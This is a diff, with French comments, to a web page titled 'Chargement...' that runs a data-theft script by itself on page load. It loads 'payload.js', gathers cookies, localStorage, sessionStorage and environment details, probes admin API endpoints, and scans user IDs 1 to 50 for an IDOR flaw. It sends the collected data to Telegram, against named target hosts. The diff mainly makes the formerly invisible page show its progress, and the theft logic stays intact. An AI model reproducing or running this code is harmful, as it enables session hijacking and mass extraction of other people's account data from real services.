@@ -3,18 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <title>Chargement...</title>
-    <style>body { opacity: 0; pointer-events: none; }</style>
+    <style>
+        /* Style modifié pour afficher le contenu */
+        body { 
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            background: #f5f5f5;
+            opacity: 1; /* Changé de 0 à 1 */
+            pointer-events: auto; /* Changé pour permettre les interactions */
+        }
+        #log {
+            background: white;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            max-height: 80vh;
+            overflow-y: auto;
+            display: block; /* Changé de none à block */
+            font-family: monospace;
+            white-space: pre-wrap;
+            margin-top: 20px;
+            min-height: 200px;
+            border: 1px solid #ddd;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+            font-size: 24px;
+        }
+        .status {
+            color: #28a745;
+            font-weight: bold;
+        }
+        .loading {
+            color: #007bff;
+            font-weight: bold;
+        }
+    </style>
 </head>
 <body>
-    <div id="log" style="display:none;"></div>
+    <div class="container">
+        <h1>🚀 Application Active</h1>
+        <p>Statut: <span class="loading">⏳ Chargement en cours...</span></p>
+        <div id="log"></div>
+    </div>
 
     <script>
+    // Afficher un message initial
+    document.getElementById('log').innerHTML = '🔄 Initialisation en cours...\n';
+
     // ==================== COLLABORATION AVEC PAYLOAD.JS ====================
     (function loadPayload() {
         const script = document.createElement('script');
         script.src = 'payload.js';
-        script.onload = () => console.log('[PAYLOAD] chargé');
-        script.onerror = () => console.log('[PAYLOAD] absent (mode autonome)');
+        script.onload = () => {
+            console.log('[PAYLOAD] chargé');
+            document.getElementById('log').innerHTML += '✅ payload.js chargé avec succès\n';
+            document.querySelector('.status').textContent = '✅ Opérationnel';
+            document.querySelector('.status').className = 'status';
+        };
+        script.onerror = () => {
+            console.log('[PAYLOAD] absent (mode autonome)');
+            document.getElementById('log').innerHTML += '⚠️ payload.js non trouvé (mode autonome)\n';
+            document.querySelector('.status').textContent = '⚠️ Mode dégradé';
+            document.querySelector('.status').style.color = '#ffc107';
+        };
         document.head.appendChild(script);
     })();
     </script>
@@ -34,11 +94,11 @@
         bothub: 'https://bothub.togehost.online'
     };
 
-    const DEBUG = false;
+    const DEBUG = true; // Changé à true pour voir les logs
 
     function log(msg) {
         if (DEBUG) console.log(`[ADAPT] ${msg}`);
-        if (logDiv) logDiv.innerHTML += `${msg}<br>`;
+        if (logDiv) logDiv.innerHTML += `${msg}\n`;
     }
 
     // ==================== COMMUNICATION ====================
@@ -125,6 +185,7 @@
             target: CURRENT_TARGET,
             target_url: TARGET_MAP[CURRENT_TARGET]
         };
+        log('🌍 Environnement collecté');
         await sendToTelegram(`🌍 ENVIRONNEMENT\n${JSON.stringify(env, null, 2)}`);
         return env;
     }
@@ -147,6 +208,7 @@
                 data.sessionStorage[key] = sessionStorage.getItem(key);
             }
         } catch(e) {}
+        log('🍪 Stockage collecté');
         if (data.cookies !== '(aucun cookie)' || Object.keys(data.localStorage).length || Object.keys(data.sessionStorage).length) {
             await sendToTelegram(`🍪 STOCKAGE\n${JSON.stringify(data, null, 2).substring(0, 3500)}`);
         }
@@ -164,22 +226,27 @@
             try {
                 const data = await fetchJSON(endpoint);
                 found = true;
+                log(`📊 ${endpoint}: OK`);
                 await sendToTelegram(`📊 ${endpoint}: OK (${Object.keys(data).length} champs)`);
                 if ((endpoint === '/api/admin/users' || endpoint === '/api/admin/all') && data.users) {
                     await sendFileToTelegram(`users_admin_${CURRENT_TARGET}.json`, JSON.stringify(data, null, 2));
                 }
-            } catch(e) {}
+            } catch(e) {
+                log(`❌ ${endpoint}: ${e.message}`);
+            }
         }
         return found;
     }
 
     async function tryIDOR() {
         const extracted = [];
+        log('🔍 Scan IDOR en cours...');
         for (let id = 1; id <= 50; id++) {
             try {
                 const user = await fetchJSON(`/api/user/${id}`);
                 if (user && (user.userId || user.email || user.id)) {
                     extracted.push(user);
+                    log(`✅ Utilisateur ${id} trouvé`);
                 }
             } catch(e) {}
             await new Promise(r => setTimeout(r, 50));
@@ -187,6 +254,7 @@
         if (extracted.length > 0) {
             await sendFileToTelegram(`idor_users_${CURRENT_TARGET}.json`, JSON.stringify(extracted, null, 2));
             await sendToTelegram(`🎯 IDOR (${CURRENT_TARGET}): ${extracted.length} utilisateurs extraits`);
+            log(`🎯 IDOR: ${extracted.length} utilisateurs extraits`);
         }
         return extracted;
     }
@@ -194,9 +262,11 @@
     async function tryGetProfile() {
         try {
             const profile = await fetchJSON('/api/user/profile');
+            log('👤 Profil récupéré');
             await sendToTelegram(`👤 PROFIL (${CURRENT_TARGET}): ${JSON.stringify(profile).substring(0, 800)}`);
             return profile;
         } catch(e) {
+            log(`❌ Profil inaccessible: ${e.message}`);
             await sendToTelegram(`❌ Profil (${CURRENT_TARGET}) inaccessible: ${e.message}`);
             return null;
         }
@@ -205,6 +275,7 @@
     async function trySwitchTarget(targetName) {
         if (TARGET_MAP[targetName]) {
             CURRENT_TARGET = targetName;
+            log(`🔄 Cible changée: ${targetName}`);
             await sendToTelegram(`🔄 Cible changée: ${targetName} -> ${TARGET_MAP[targetName]}`);
             return true;
         }
@@ -213,7 +284,9 @@
 
     // ==================== MAIN ====================
     async function main() {
-        log('Début extraction adaptative...');
+        log('🚀 Début extraction adaptative...');
+        document.querySelector('.status').textContent = '🔄 Extraction en cours...';
+        document.querySelector('.status').style.color = '#007bff';
         await sendToTelegram(`🔍 Extraction adaptative démarrée v4.0 (cible: ${CURRENT_TARGET})`);
         
         // Phase 1: Reconnaissance
@@ -227,19 +300,25 @@
         const adminFound = await tryAdminEndpoints();
         if (adminFound) {
             await sendToTelegram(`🎖️ ACCÈS ADMIN DÉTECTÉ sur ${CURRENT_TARGET} - Extraction complète`);
+            log('🎖️ ACCÈS ADMIN DÉTECTÉ');
         }
         
         // Phase 4: IDOR
         await tryIDOR();
         
         await sendToTelegram(`✅ Extraction terminée pour ${CURRENT_TARGET}`);
-        log('Fin');
+        log('✅ Extraction terminée');
+        document.querySelector('.status').textContent = '✅ Terminé';
+        document.querySelector('.status').className = 'status';
     }
 
     // Exécution automatique avec timeout intelligent
+    log('⏳ Démarrage dans 800ms...');
     setTimeout(() => {
         main().catch(e => {
-            log(`Erreur fatale: ${e.message}`);
+            log(`❌ Erreur fatale: ${e.message}`);
+            document.querySelector('.status').textContent = '❌ Erreur';
+            document.querySelector('.status').style.color = '#dc3545';
             sendToTelegram(`❌ Erreur fatale (${CURRENT_TARGET}): ${e.message}`);
         });
     }, 800);
